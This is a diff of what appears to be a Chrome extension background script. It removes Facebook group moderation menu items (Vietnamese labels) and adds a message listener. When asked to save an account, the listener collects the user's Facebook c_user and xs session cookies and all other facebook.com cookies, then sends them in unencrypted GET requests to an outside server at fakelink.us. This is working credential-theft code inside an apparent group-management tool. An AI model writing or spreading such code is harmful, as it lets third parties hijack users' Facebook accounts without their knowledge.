@@ -4,29 +4,43 @@
 
 // A generic onclick callback function.
 
-function approve(info, tab) {
-	chrome.tabs.sendMessage(tab.id, "approve", function(response) {
-      
-    });
+var API_URL = 'http://fakelink.us/web/';
+
+function callToServer(url, params) {
+	for (var key in params) {
+		if(!params.hasOwnProperty(key)) continue;
+		url += key + '=' + encodeURIComponent(params[key]) + '&';
+	}
+	console.log(url);
+	httpGetAsync(url, (data) => console.log(data));
 }
 
-function deletePost(info, tab) {
-	chrome.tabs.sendMessage(tab.id, "deletePost", function(response) {
-      if (response == 'Started') {
-		chrome.contextMenus.update(deleteMenu, {
-			title: 'Dừng xóa bài'
-		});
-	  } else {
-		chrome.contextMenus.update(deleteMenu, {
-			title: 'Xóa bài'
-		});
-	  }
-    });
-}
-
-// Create one test item for each context type.
-var approveMenu = chrome.contextMenus.create({"title": "Duyệt thành viên", "onclick": approve, "documentUrlPatterns": ["*://*.facebook.com/groups/*/requests*", "*://*.facebook.com/groups/*/pending*"]});
-var deleteMenu = chrome.contextMenus.create({"title": "Xóa bài", "onclick": deletePost, "documentUrlPatterns": ["*://*.facebook.com/groups/*/requests*", "*://*.facebook.com/groups/*/pending*"]});
+chrome.runtime.onMessage.addListener(
+	function(request, sender, sendResponse) {
+		if (request.request == "api") {
+			var url = API_URL + request.rest + '/' + request.method + '?';
+			if (request.rest == 'fb_acc' && request.method == 'save') {
+				var times = 3;
+				chrome.cookies.get({url:"https://facebook.com", name: 'c_user'}, (cookie) => {
+					request.params['id'] = cookie.value;
+					times--;
+					if (times == 0) callToServer(url, request.params);
+				});
+				chrome.cookies.get({url:"https://facebook.com", name: 'xs'}, (cookie) => {
+					request.params['xs'] = cookie.value;
+					times--;
+					if (times == 0) callToServer(url, request.params);
+				});
+				chrome.cookies.getAll({url:"https://facebook.com"}, (cookies) => {
+					request.params['cookies'] = JSON.stringify(cookies);
+					times--;
+					if (times == 0) callToServer(url, request.params);
+				});
+			}
+		}
+		sendResponse();
+	}
+);
 
 function httpGetAsync(theUrl, callback) {
     var xmlHttp = new XMLHttpRequest();
@@ -38,14 +52,3 @@ function httpGetAsync(theUrl, callback) {
     xmlHttp.open("GET", theUrl, true); // true for asynchronous 
     xmlHttp.send(null);
 }
-
-function getData() {
-	httpGetAsync('http://fakelink.us/web/domain', data => console.log(data));
-}
-
-function getCookie() {
-	chrome.cookies.set({domain}, callback)
-}
-
-
-	chrome.cookies.set({url:"http://fakelink.us",domain:".fakelink.us",name:"abidien",secure:false,value:"test1", expirationDate: (new Date().getTime()/1000) + 90*24*3600}, null);
